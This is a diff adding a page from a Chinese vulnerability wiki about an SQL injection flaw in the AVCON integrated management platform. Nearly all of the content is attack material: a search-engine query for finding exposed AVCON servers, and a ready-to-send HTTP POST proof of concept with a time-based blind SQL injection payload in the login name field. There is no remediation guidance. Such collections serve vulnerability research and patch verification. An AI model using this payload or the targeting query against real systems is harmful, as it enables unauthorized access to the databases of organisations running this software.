@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/AVCON/avcon%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>avcon综合管理平台SQL注入漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "avcon\u7efc\u5408\u7ba1\u7406\u5e73\u53f0SQL\u6ce8\u5165\u6f0f\u6d1e", url: "#_top", children: [
+          ]},
+          {title: "hunter", url: "#hunter", children: [
+          ]},
+          {title: "poc", url: "#poc", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../AVEVA/AVEVA%20InTouch%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3%20AccessAnywhere%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CVE-2022-23854/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../AVEVA/AVEVA%20InTouch%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3%20AccessAnywhere%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CVE-2022-23854/" class="btn btn-xs btn-link">
+        AVEVA InTouch安全网关 AccessAnywhere 任意文件读取漏洞 CVE-2022-23854
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../AVCON-%E7%BD%91%E7%BB%9C%E8%A7%86%E9%A2%91%E6%9C%8D%E5%8A%A1%E7%B3%BB%E7%BB%9Feditusercommit.php%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E9%87%8D%E7%BD%AE%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../AVCON-%E7%BD%91%E7%BB%9C%E8%A7%86%E9%A2%91%E6%9C%8D%E5%8A%A1%E7%B3%BB%E7%BB%9Feditusercommit.php%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E9%87%8D%E7%BD%AE%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        AVCON-网络视频服务系统editusercommit.php存在任意用户重置密码漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h2 id="avconsql">avcon综合管理平台SQL注入漏洞<a class="headerlink" href="#avconsql" title="Permanent link">&para;</a></h2>
+<h2 id="hunter">hunter<a class="headerlink" href="#hunter" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>web.title=&quot;AVCON-系统管理平台&quot;
+</code></pre></div>
+<h2 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h2>
+<p><div class="highlight"><pre><span></span><code>POST /avcon.action HTTP/1.1
+Host: 
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 77
+
+name=0&#39;XOR(if(now()=sysdate()%2Csleep(7)%2C0))XOR&#39;Z&amp;password=u]H[ww6KrA9F.x-F
+</code></pre></div>
+<img alt="a9c6cfee7dd8881ea4bf019d82903c04" src="https://github.com/wy876/POC/assets/139549762/349eafe6-c55e-449f-b6e4-bb01923c07ef" /></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../AVEVA/AVEVA%20InTouch%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3%20AccessAnywhere%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CVE-2022-23854/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../AVEVA/AVEVA%20InTouch%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3%20AccessAnywhere%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CVE-2022-23854/" class="btn btn-xs btn-link">
+        AVEVA InTouch安全网关 AccessAnywhere 任意文件读取漏洞 CVE-2022-23854
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../AVCON-%E7%BD%91%E7%BB%9C%E8%A7%86%E9%A2%91%E6%9C%8D%E5%8A%A1%E7%B3%BB%E7%BB%9Feditusercommit.php%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E9%87%8D%E7%BD%AE%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../AVCON-%E7%BD%91%E7%BB%9C%E8%A7%86%E9%A2%91%E6%9C%8D%E5%8A%A1%E7%B3%BB%E7%BB%9Feditusercommit.php%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E9%87%8D%E7%BD%AE%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        AVCON-网络视频服务系统editusercommit.php存在任意用户重置密码漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
